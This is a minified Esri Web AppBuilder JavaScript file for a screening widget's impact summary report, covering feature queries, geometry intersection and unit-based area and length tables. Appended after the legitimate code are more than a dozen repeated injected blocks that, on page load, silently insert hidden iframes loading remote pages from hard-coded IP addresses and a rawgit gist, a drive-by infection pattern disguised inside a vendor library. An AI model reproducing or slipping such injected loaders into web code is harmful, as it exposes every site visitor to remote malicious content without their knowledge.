// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Screening/impactSummaryReport/impactSummaryReport.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"esriCTImpactSummaryLayerContainer" data-dojo-attach-point\x3d"impactSummaryLayerContainer"\x3e\r\n    \x3c!--title \x26 field icon table--\x3e\r\n    \x3cdiv class\x3d"esriCTLayerTitleAndFieldParentContainer esriCTLayerSectionDisabled esriCTCursorPointer" data-dojo-attach-point\x3d"layerTitleAndFieldParentContainer"\x3e\r\n      \x3c!--title \x26 field icon row--\x3e\r\n      \x3cdiv class\x3d"esriCTLayerTitleAndFieldChildContainer"\x3e\r\n        \x3cdiv class\x3d"esriCTLayerPanelIcon esriCTLayerPanelExpand" data-dojo-attach-point\x3d"layerSectionIcon"\x3e\r\n        \x3c/div\x3e\r\n        \x3c!--title--\x3e\r\n        \x3cdiv class\x3d"esriCTImpactSummaryLayerTitle" data-dojo-attach-point\x3d"impactSummaryLayerTitle"\x3e\r\n        \x3c/div\x3e\r\n        \x3c!--field icon--\x3e\r\n        \x3cdiv class\x3d"esriCTImpactSummaryLayerFieldIcon esriCTImpactSummaryLayerFieldIconDisabled" data-dojo-attach-point\x3d"impactSummaryLayerField"\r\n          title\x3d"${nls.reportsTab.attributeChooserTooltip}"\x3e\x3c/div\x3e\r\n        \x3c!--feature count--\x3e\r\n        \x3cdiv class\x3d"esriCTImpactSummaryLayerFeatureCount esriCTLoadingIcon" data-dojo-attach-point\x3d"impactSummaryLayerFeatureCount"\x3e\x3c/div\x3e\r\n        \x3c!-- Hint for count exceeding max record count --\x3e\r\n        \x3cdiv class\x3d"esriCTImpactSummaryLayerMaxRecordHint esriCTHidden" title\x3d"${nls.reportsTab.unableToAnalyzeText}" data-dojo-attach-point\x3d"impactSummaryLayerMaxRecordHint"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3c!--layer description--\x3e\r\n    \x3cdiv class\x3d"esriCTImpactSummaryLayerDetailContainer esriCTHidden" data-dojo-attach-point\x3d"impactSummaryLayerDetailContainer"\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"impactSummaryLayerDetailsMsg"\x3e\x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"impactSummaryLayerDetails"\x3e\x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"noFieldsSelectedContainer" class\x3d"esriCTNoFieldSelectedContainer esriCTHidden"\x3e\r\n        ${nls.reportsTab.noFieldsSelected}\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/text!./impactSummaryReport.html dijit/_WidgetsInTemplateMixin dojo/_base/lang dojo/_base/array dojo/Evented jimu/BaseWidget dojo/on dojo/dom-class dojo/dom-attr esri/geometry/geometryEngine esri/geometry/Polyline esri/SpatialReference esri/graphic dojo/dom-construct esri/tasks/query esri/tasks/QueryTask dojo/Deferred ../geometryUtils ../conversionUtils ../highlightSymbolUtils ../fieldSelectorPopup/fieldSelectorPopup esri/lang jimu/utils dojo/query dojo/number dojo/promise/all".split(" "),
function(B,C,D,f,l,E,F,t,k,m,n,G,H,w,q,x,y,u,z,I,J,K,L,r,A,v,M){return B([F,D,E],{baseClass:"jimu-widget-screening-impactSummaryReport",templateString:C,_feetUnitData:[],_milesUnitData:[],_metersUnitData:[],_kilometersUnitData:[],_hectaresUnitData:[],_printCompleteData:{},_printData:{},_feetUnitInfo:[],_milesUnitInfo:[],_metersUnitInfo:[],_kilometersUnitInfo:[],_hectaresUnitInfo:[],_intersectFeatureCount:0,isExceedingMaxRecordCount:!1,intersectingFeatureIdsToTolerance:[],intersectingFeatureIds:[],
_analysisUnitsArray:[],_aggregatedFeatureGeometries:[],_featureIntersectResultArr:[],constructor:function(a){this._feetUnitData=[];this._milesUnitData=[];this._metersUnitData=[];this._kilometersUnitData=[];this._hectaresUnitData=[];this._printCompleteData={};this._printData={};this._feetUnitInfo=[];this._milesUnitInfo=[];this._metersUnitInfo=[];this._kilometersUnitInfo=[];this._hectaresUnitInfo=[];this._intersectFeatureCount=0;this.isExceedingMaxRecordCount=!1;this.intersectingFeatureIdsToTolerance=
[];this.intersectingFeatureIds=[];this._analysisUnitsArray=[];this._aggregatedFeatureGeometries=[];this._featureIntersectResultArr=[];f.mixin(this,a)},postCreate:function(){this._analysisUnitsArray=["Feet","Miles","Meters","Kilometers","Hectares"];this.own(t(this.impactSummaryLayerMaxRecordHint,"click",f.hitch(this,function(a){a.stopPropagation();a.preventDefault();this.isExceedingMaxRecordCount?this.emit("showMessage",this.nls.reportsTab.unableToAnalyzeText):this.emit("showMessage",this.nls.reportsTab.layerNotVisibleText)})))},
_displayLayerNotVisibleText:function(){k.add(this.impactSummaryLayerFeatureCount,"esriCTHidden");k.remove(this.layerTitleAndFieldParentContainer,"esriCTLayerSectionDisabled");m.set(this.impactSummaryLayerMaxRecordHint,"title",this.nls.reportsTab.layerNotVisibleText);k.remove(this.impactSummaryLayerMaxRecordHint,"esriCTHidden");k.add(this.impactSummaryLayerTitle,"esriCTLayerTitleOverrideWidth");this._showMessage(this.nls.reportsTab.layerNotVisibleText)},generateReport:function(a,b,c){var d,e,g;d=new u;
this._setAttributeToFeatureLayerContainer();this._setFeatureLayerTitle();this._attachEventToLayerTitle();this._aggregatedFeatureGeometries=[];this._featureIntersectResultArr=[];(g=this.layerInfosObj.getLayerInfoById(this.featureLayer.id))&&g.isVisible()&&g.isInScale()||g&&!g.isVisible()&&!this.config.allowVisibleLayerAnalysisOnly||g&&!g.isInScale()&&!this.config.allowVisibleLayerAnalysisOnly||this.isFeatureCollectionLayer?this._getIntersectingFeaturesCount(c).then(f.hitch(this,function(c){this._getIntersectingFeaturesCount(b).then(f.hitch(this,
function(g){this.intersectingFeatureIdsToTolerance=this._getUniqueIds(c,g);this._getIntersectingFeaturesCount(a).then(f.hitch(this,function(c){var h;this.intersectingFeatureIds=f.clone(c);c=this._getUniqueIds(g,c);this.isExceedingMaxRecordCount?(this._setFeatureLayerIntersectFeatureCount(c.length),this._pushDataInPrintDataObj(this.configuredLayerLabel,null,null),this._printData={},this._printData=f.clone(this._printCompleteData),this._showMessage(this.nls.reportsTab.unableToAnalyzeText),k.remove(this.layerTitleAndFieldParentContainer,
"esriCTLayerSectionDisabled"),this._showReport(),d.resolve(this._getReportLayerDetails([]))):(h=a||b,this._getFeatureByChunks(c,h).then(f.hitch(this,function(b){var c;c=[];this._featureIntersectResultArr=[];l.forEach(b,f.hitch(this,function(b){a&&n.touches(b.geometry,a)||c.push(b)}));b=[];this._setFeatureLayerIntersectFeatureCount(c.length);0<c.length?("esriGeometryPolyline"!==this.featureLayer.geometryType&&"esriGeometryPolygon"!==this.featureLayer.geometryType||!a?b=c:(e=this._polygonToPolyline(a),
b=this._getCutOrWithInFeatures(e,c,a)),this._createLayerDetails(b,this.featureLayer.geometryType),this._filterPrintDataObjAccToConfiguredFields(this.configuredField),k.remove(this.impactSummaryLayerField,"esriCTImpactSummaryLayerFieldIconDisabled")):(this._pushDataInPrintDataObj(this.configuredLayerLabel,null,null),this._printData={},this._printData=f.clone(this._printCompleteData),this._showMessage(this.nls.reportsTab.noDetailsAvailableText));k.remove(this.layerTitleAndFieldParentContainer,"esriCTLayerSectionDisabled");
this._featureIntersectResultArr=b;this._showReport();d.resolve(this._getReportLayerDetails(b))})))}))}))})):(this._displayLayerNotVisibleText(),d.resolve());return d.promise},_getReportLayerDetails:function(a){var b={};b.id=this.id;b.featureLayerId=this.featureLayer.id;b.features=a;b.printInfo={};b.printInfo.isExceedingMaxRecordCount=this.isExceedingMaxRecordCount;b.printInfo.featureCount=this._intersectFeatureCount;b.printInfo.info=this._printData;b.printInfo.feetUnitInfo=this._feetUnitInfo;b.printInfo.milesUnitInfo=
this._milesUnitInfo;b.printInfo.metersUnitInfo=this._metersUnitInfo;b.printInfo.kilometersUnitInfo=this._kilometersUnitInfo;b.printInfo.hectaresUnitInfo=this._hectaresUnitInfo;b.printInfo.geometryType=this.featureLayer.geometryType;return b},_setAttributeToFeatureLayerContainer:function(){m.set(this.impactSummaryLayerContainer,"featureLayerID",this.featureLayer.id)},_setFeatureLayerTitle:function(){this.configuredLayerLabel||(this.configuredLayerLabel=this.featureLayer.name);m.set(this.impactSummaryLayerTitle,
"innerHTML",this.configuredLayerLabel);m.set(this.impactSummaryLayerTitle,"title",this.configuredLayerLabel)},_attachEventToLayerTitle:function(){this.own(t(this.layerTitleAndFieldParentContainer,"click",f.hitch(this,function(a){k.contains(a.target,"esriCTImpactSummaryLayerFieldIcon")?k.contains(this.impactSummaryLayerField,"esriCTImpactSummaryLayerFieldIconDisabled")||this._createFieldSelectorPopupWidget():k.contains(this.layerTitleAndFieldParentContainer,"esriCTLayerSectionDisabled")||this._showOrHideLayerDetailsContainer()})))},
_createFieldSelectorPopupWidget:function(){if(this._fieldSelectorWidget)this._fieldSelectorWidget.onFieldsSelectorClick();else this._fieldSelectorWidget=new K({outFields:this.configuredField,popupTitle:this.configuredLayerLabel,fieldTitle:this.nls.reportsTab.selectReportFieldTitle,nls:this.nls,appConfig:this.appConfig}),t(this._fieldSelectorWidget,"onFieldSelectComplete",f.hitch(this,function(a){this._filterFieldsForReport(a)})),this._fieldSelectorWidget.startup();"DartTheme"===this.appConfig.theme.name&&
k.add(this._fieldSelectorWidget.fieldsPopup.domNode,"esriCTDartPanel")},_filterFieldsForReport:function(a){var b=f.clone(this.configuredField),c;for(c in this.configuredField)-1>=a.indexOf(c)&&delete b[c];this._filterPrintDataObjAccToConfiguredFields(b);(a=A(".esriCTAttrTableHighlighted",this.domNode.parentElement))&&0<a.length&&m.get(a[0],"esriCTLayerId")===this.featureLayer.id&&(k.remove(a[0],"esriCTAttrTableHighlighted"),this.highlightGraphicsLayer.clear());this._showReport();this.emit("printDataUpdated",
{id:this.id,printData:this._printData})},_showOrHideLayerDetailsContainer:function(){k.toggle(this.layerTitleAndFieldParentContainer,"esriCTBoldFont");k.toggle(this.impactSummaryLayerDetailContainer,"esriCTHidden");k.contains(this.layerSectionIcon,"esriCTLayerPanelExpand")?k.replace(this.layerSectionIcon,"esriCTLayerPanelCollapse","esriCTLayerPanelExpand"):k.replace(this.layerSectionIcon,"esriCTLayerPanelExpand","esriCTLayerPanelCollapse")},_getIntersectingFeaturesCount:function(a){var b,c,d,e;b=
new u;if(a)if(this.isFeatureCollectionLayer){c=[];if(0<this.featureLayer.graphics.length)for(e=0;e<this.featureLayer.graphics.length;e++)(d=n.intersects(a,this.featureLayer.graphics[e].geometry))&&c.push(e);b.resolve(c)}else{c=new x;d=new y(this.featureLayer.url);if(e=this.featureLayer.getDefinitionExpression())c.where=e;c.geometry=a;d.executeForIds(c,f.hitch(this,function(a){a&&0!==a.length?(a.length>this.maxFeaturesForAnalysis&&(k.remove(this.impactSummaryLayerMaxRecordHint,"esriCTHidden"),k.add(this.impactSummaryLayerTitle,
"esriCTLayerTitleOverrideWidth"),this.isExceedingMaxRecordCount=!0,this.emit("exceedingMaxRecordCount")),b.resolve(a)):b.resolve([])}))}else b.resolve([]);return b.promise},_getFeatureByChunks:function(a,b){var c,d,e;d=new u;c=[];e=this.featureLayer.maxRecordCount;if(this.isFeatureCollectionLayer)c.push(this._getIntersectFeature(a,b));else for(;0<a.length;)c.push(this._getIntersectFeature(a.splice(0,e),b));M(c).then(f.hitch(this,function(a){var b;b=[];l.forEach(a,f.hitch(this,function(a){b=b.concat(a)}));
d.resolve(b)}));return d.promise},_getIntersectFeature:function(a,b){var c,d,e;c=new u;if(this.isFeatureCollectionLayer){d=[];if(0<this.featureLayer.graphics.length)for(a=0;a<this.featureLayer.graphics.length;a++)(e=n.intersects(b,this.featureLayer.graphics[a].geometry))&&d.push(this.featureLayer.graphics[a]);c.resolve(d.splice(0,this.maxFeaturesForAnalysis))}else d=new x,d.outFields=["*"],d.returnGeometry=!0,d.objectIds=a,d.outSpatialReference=b.spatialReference,b=new y(this.featureLayer.url),b.execute(d,
f.hitch(this,function(a){a.features?c.resolve(a.features):c.resolve([])}),f.hitch(this,function(){c.resolve([])}));return c.promise},_setFeatureLayerIntersectFeatureCount:function(a){this._intersectFeatureCount=v.format(a);k.remove(this.impactSummaryLayerFeatureCount,"esriCTLoadingIcon");m.set(this.impactSummaryLayerFeatureCount,"innerHTML","("+this._intersectFeatureCount+")");m.set(this.impactSummaryLayerFeatureCount,"title","("+this._intersectFeatureCount+")")},_getCutOrWithInFeatures:function(a,
b,c){var d,e;d=[];for(var g=0;g<a.length;g++)for(var h=0;h<b.length;h++){e=n.cut(b[h].geometry,a[g]);if(1<e.length){var f=1;n.within(c,b[h].geometry)&&(f=0);e=new w(e[f],null,b[h].attributes)}else n.within(b[h].geometry,c),e=new w(b[h].geometry,null,b[h].attributes);d.push(e)}return d},_polygonToPolyline:function(a){var b,c,d,e,g;b=[];c=new G(new H({wkid:102100}));for(g=0;g<a.rings.length;g++){e=[];for(d=0;d<a.rings[g].length;d++)e.push(a.rings[g][d]);c.addPath(e)}b.push(c);return b},_updateFormattedAttribute:function(a){l.forEach(a,
f.hitch(this,function(b,c){var d,e;-1===this.intersectingFeatureIds.indexOf(b.attributes[this.featureLayer.objectIdField])&&(e=!0);d=this._getFormatedAttrs(f.clone(b.attributes),this.featureLayer.fields,this.featureLayer.typeIdField,this.featureLayer.types,null);a[c].setAttributes(d);l.forEach(this.featureLayer.fields,f.hitch(this,function(b){var d;a[c].attributes.hasOwnProperty(b.name)||(a[c].attributes[b.name]=this.nls.reportsTab.noDataText);a[c].attributes.hasOwnProperty(b.name)&&(d=a[c].attributes[b.name],
void 0===d||""===d||null===d?a[c].attributes[b.name]=this.nls.reportsTab.noDataText:""===f.trim(d.toString())&&(a[c].attributes[b.name]=this.nls.reportsTab.noDataText))}));if(!e||"esriGeometryPolygon"!==this.featureLayer.geometryType&&"esriGeometryPolyline"!==this.featureLayer.geometryType)switch(this.featureLayer.geometryType){case "esriGeometryPolygon":b=z.getAreaOfGeometry(b.geometry);this._feetUnitData.push(b.squareFeet);this._milesUnitData.push(b.acres);this._metersUnitData.push(b.squareMeters);
this._kilometersUnitData.push(b.squareKilometer);this._hectaresUnitData.push(b.hectares);break;case "esriGeometryPolyline":b=z.getLengthOfGeometry(b.geometry),this._feetUnitData.push(b.feet),this._milesUnitData.push(b.miles),this._metersUnitData.push(b.meters),this._kilometersUnitData.push(b.kilometers),this._hectaresUnitData.push(b.kilometers)}else this._feetUnitData.push(0),this._milesUnitData.push(0),this._metersUnitData.push(0),this._kilometersUnitData.push(0),this._hectaresUnitData.push(0)}));
return a},_getFieldText:function(a,b){return a.label?a.label:a.alias?a.alias:b},_createLayerDetails:function(a,b){var c,d,e,g;g=Object.keys(this.configuredField).length;a=this._updateFormattedAttribute(a);this._pushDataInPrintDataObj(this.configuredLayerLabel,null,null);for(e in this.configuredField)for(c=this.configuredField[e],c=this._getFieldText(c,e),this._printCompleteData.cols.push(c),c=0;c<a.length;c++)switch((d=a[c].attributes[e])||0===d?this._pushDataInPrintDataObj(null,c,d):this._pushDataInPrintDataObj(null,
c,""),b){case "esriGeometryPolygon":case "esriGeometryPolyline":this._printCompleteData.cols.length===g&&(this._feetUnitInfo.push(this._feetUnitData[c]),this._milesUnitInfo.push(this._milesUnitData[c]),this._metersUnitInfo.push(this._metersUnitData[c]),this._kilometersUnitInfo.push(this._kilometersUnitData[c]),this._hectaresUnitInfo.push(this._hectaresUnitData[c]));break;case "esriGeometryPoint":this._printCompleteData.cols.length===g&&(this._feetUnitInfo.push(1),this._milesUnitInfo.push(1),this._metersUnitInfo.push(1),
this._kilometersUnitInfo.push(1),this._hectaresUnitInfo.push(1))}},_pushDataInPrintDataObj:function(a,b,c){a?(this._printCompleteData={},this._feetUnitInfo=[],this._milesUnitInfo=[],this._metersUnitInfo=[],this._kilometersUnitInfo=[],this._hectaresUnitInfo=[],this._printCompleteData.title=a,this._printCompleteData.rows=[],this._printCompleteData.cols=[]):(c===this.nls.reportsTab.noDataText&&(c="\x3ci\x3e"+c+"\x3c/i\x3e"),this._printCompleteData.rows[b]||this._printCompleteData.rows.push([]),this._printCompleteData.rows[b].push(c))},
_filterPrintDataObjAccToConfiguredFields:function(a){var b,c,d;this._printData={};this._printData=f.clone(this._printCompleteData);for(b=this._printData.cols.length-1;0<=b;--b){c=!1;for(d in a)switch(this._printData.cols[b]){case a[d].label:c=!0;break;case a[d].alias:c=!0;break;case d:c=!0}if(!c)for(this._printData.cols.splice(b,1),c=0;c<this._printData.rows.length;c++)this._printData.rows[c].splice(b,1)}},_getFormatedAttrs:function(a,b,c,d,e){function g(b){if(e&&L.isDefined(e.fieldInfos))for(var a=
0,c=e.fieldInfos.length;a<c;a++){var d=e.fieldInfos[a];if(d.fieldName===b)return d.format}return null}var h={};l.forEach(b,f.hitch(this,function(e,f){if(a[e.name]){var k=!(!e.domain||"codedValue"!==e.domain.type),m="esriFieldTypeDate"===e.type,l=c&&e.name===c,p=e.name;if("esriFieldTypeDate"===b[f].type)h[p]=r.fieldFormatter.getFormattedDate(a[e.name],g(e.name));else if("esriFieldTypeDouble"===b[f].type||"esriFieldTypeSingle"===b[f].type||"esriFieldTypeInteger"===b[f].type||"esriFieldTypeSmallInteger"===
b[f].type)h[p]=this._getFormattedNumber(a[e.name],g(e.name));k?h[p]=r.fieldFormatter.getCodedValue(e.domain,a[e.name]):l?h[p]=r.fieldFormatter.getTypeName(a[e.name],d):k||m||l||(h[p]=p in h?h[p]:a[e.name],h[p]=this._getCodeValueFromTypes(e,c,d,a,h))}}));return h},_getFormattedNumber:function(a,b){if("number"===typeof a){var c=(a.toString().split(".")[1]||"").length;return(a=r.localizeNumberByFieldInfo(a,{format:{places:b&&"number"===typeof b.places?parseInt(b.places,10):c,digitSeparator:b&&b.digitSeparator}}))||
""}return a},_getCodeValueFromTypes:function(a,b,c,d,e){var g=null;b&&c&&0<c.length&&(c=(c=l.filter(c,f.hitch(this,function(a){return a.name===d[b]})))&&c[0]||null)&&c.domains&&c.domains[a.name]&&c.domains[a.name].codedValues&&(g=r.fieldFormatter.getCodedValue(c.domains[a.name],d[a.name]));a=a.name;return(e=null!==g?g:e[a])||isFinite(e)?e:""},_getArrayIndex:function(a,b){var c,d,e,f=[];for(c=0;c<a.length;++c)if(b.length===a[c].length){e=a[c];for(d=0;d<b.length&&b[d]===e[d];)++d;d===b.length&&f.push(c)}return f},
getSum:function(a,b){a=(b&&0<b.length?l.filter(a,function(a,d){return-1<b.indexOf(d)}):a).reduce(function(a,b){return a+b},0);return.01<a?I.honourPopupRounding(2,a):a},_getAggregatedColTitle:function(a){var b;switch(a){case "esriGeometryPoint":b=this.nls.reportsTab.featureCountText;break;case "esriGeometryPolyline":b=this.nls.reportsTab.featureLengthText;break;case "esriGeometryPolygon":b=this.nls.reportsTab.featureAreaText}return b},_getUnitsForGeometry:function(a,b){var c;switch(a){case "esriGeometryPoint":c=
"";break;case "esriGeometryPolyline":c=this._getAnalysisUnitForGeometry(b,a);break;case "esriGeometryPolygon":c=this._getAnalysisUnitForGeometry(b,a)}return c},_getAnalysisUnitForGeometry:function(a,b){var c;switch(a){case "Feet":c="esriGeometryPolygon"===b?this.nls.units.feetAbbr+"2".sup():this.nls.units.feetAbbr;break;case "Miles":c="esriGeometryPolygon"===b?this.nls.units.acresAbbr:this.nls.units.milesAbbr;break;case "Meters":c="esriGeometryPolygon"===b?this.nls.units.metersAbbr+"2".sup():this.nls.units.metersAbbr;
break;case "Kilometers":c="esriGeometryPolygon"===b?this.nls.units.kilometersAbbr+"2".sup():this.nls.units.kilometersAbbr;break;case "Hectares":c="esriGeometryPolygon"===b?this.nls.reportsTab.hectaresAbbr:this.nls.units.kilometersAbbr}return c},_showMessage:function(a){q.empty(this.impactSummaryLayerDetails);m.set(this.impactSummaryLayerDetailsMsg,"innerHTML",a);k.add(this.impactSummaryLayerDetailsMsg,"esriCTLayerDetailCenterText")},_showReport:function(){var a,b,c,d,e,g=[];a=this._printData;q.empty(this.impactSummaryLayerDetails);
if(!a.cols.length&&0<a.rows.length)this._showMessage(this.nls.reportsTab.noFieldsSelected);else if(a.rows&&0<a.rows.length){m.set(this.impactSummaryLayerDetailsMsg,"innerHTML","");k.remove(this.impactSummaryLayerDetailsMsg,"esriCTLayerDetailCenterText");b=[];d={};for(var h=0;h<a.rows.length&&(0>b.indexOf(h)&&(c=this._getArrayIndex(a.rows,a.rows[h]),d[h]=c,b=b.concat(c)),b.length!==a.rows.length);h++);b={rows:[],cols:f.clone(a.cols)};c=this._getAggregatedColTitle(this.featureLayer.geometryType);b.cols.push(c);
b.cols.push(c);b.cols.push(c);b.cols.push(c);b.cols.push(c);for(e in d)c=f.clone(a.rows[parseInt(e,10)]),c.push(this.getSum(this._feetUnitInfo,d[parseInt(e,10)])),c.push(this.getSum(this._milesUnitInfo,d[parseInt(e,10)])),c.push(this.getSum(this._metersUnitInfo,d[parseInt(e,10)])),b.rows.push(c),c.push(this.getSum(this._kilometersUnitInfo,d[parseInt(e,10)])),h=this.getSum(this._hectaresUnitInfo,d[parseInt(e,10)]),c.push(h),this._featureIntersectResultArr&&g.push({features:this._getAggregatedFeatures(d[e]),
sortValue:h});this._renderReport(b,g)}},_getAggregatedFeatures:function(a){var b=[];l.forEach(a,f.hitch(this,function(a){b.push(this._featureIntersectResultArr[a])}));return b},_sortFeatureArray:function(a,b){var c=a.length-1;return a[c]<b[c]?1:a[c]>b[c]?-1:0},_sortArrayByKey:function(a,b){return a.sortValue<b.sortValue?1:a.sortValue>b.sortValue?-1:0},_createTemplateNode:function(){var a;a=q.create("table",{"class":"esriCTAttrTable esriCTCursorPointer",cellpadding:"0px",cellspacing:"0px"},this.impactSummaryLayerDetails);
q.create("div",{"class":"esriCTInfoDataSeparator"},this.impactSummaryLayerDetails);this.own(t(a,"click",f.hitch(this,this._highlightSelection)));return a},_renderReport:function(a,b){a.rows&&0<a.rows.length&&(a.rows=a.rows.sort(this._sortFeatureArray),this._aggregatedFeatureGeometries=b=b.sort(this._sortArrayByKey),l.forEach(a.rows,f.hitch(this,function(b,d){var c,g;c=this._createTemplateNode();m.set(c,"esriCTTableIndex",d);m.set(c,"esriCTLayerId",this.featureLayer.id);l.forEach(b,f.hitch(this,function(d,
e){var f,h,l,n;g=q.create("tr",{valign:"top"},c);n=q.create("td",{"class":"esriCTAttrName"},g);l=q.create("td",{"class":"esriCTAttrValue"},g);d=r.fieldFormatter.getFormattedUrl(d);f=a.cols[e]+": ";h=d;e>=b.length-5&&(e-=b.length-5,.01<=d?(d="esriGeometryPoint"!==this.featureLayer.geometryType?v.format(d,{places:2}):v.format(d),h=f+d+" "+this._getUnitsForGeometry(this.featureLayer.geometryType,this._analysisUnitsArray[e])):h=.01>d&&0!==d?f+"  \x3c "+v.format(.01)+" "+this._getUnitsForGeometry(this.featureLayer.geometryType,
this._analysisUnitsArray[e]):f+" "+this.nls.reportsTab.notApplicableText,f="",k.add(n,"esriCTReportsTabInfoData"),k.add(l,"esriCTInfoDataMeasurement esriCTReportsTabInfoData esriCTFieldDistinct"+this._analysisUnitsArray[e]+"UnitData"),this.config.areaUnits!==this._analysisUnitsArray[e]&&k.add(l,"esriCTHidden"));m.set(n,"innerHTML",f);m.set(l,"innerHTML",h)}))})))},_getUniqueIds:function(a,b){if(0===a.length)return b;if(0===b.length)return a;l.forEach(a,f.hitch(this,function(a){a=b.indexOf(a);-1!==
a&&b.splice(a,1)}));return a.concat(b)},_highlightSelection:function(a){var b;b=a.currentTarget;k.contains(b,"esriCTAttrTableHighlighted")?(k.remove(b,"esriCTAttrTableHighlighted"),this.highlightGraphicsLayer.clear()):((a=A(".esriCTAttrTableHighlighted",this.domNode.parentElement))&&0<a.length&&k.remove(a[0],"esriCTAttrTableHighlighted"),this.highlightGraphicsLayer.clear(),k.add(b,"esriCTAttrTableHighlighted"),a=m.get(b,"esriCTTableIndex"),a=this._aggregatedFeatureGeometries[parseInt(a,10)].features,
l.forEach(a,f.hitch(this,function(a){a=J.getHighLightSymbol(a,this.featureLayer);this.highlightGraphicsLayer.add(a)})))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});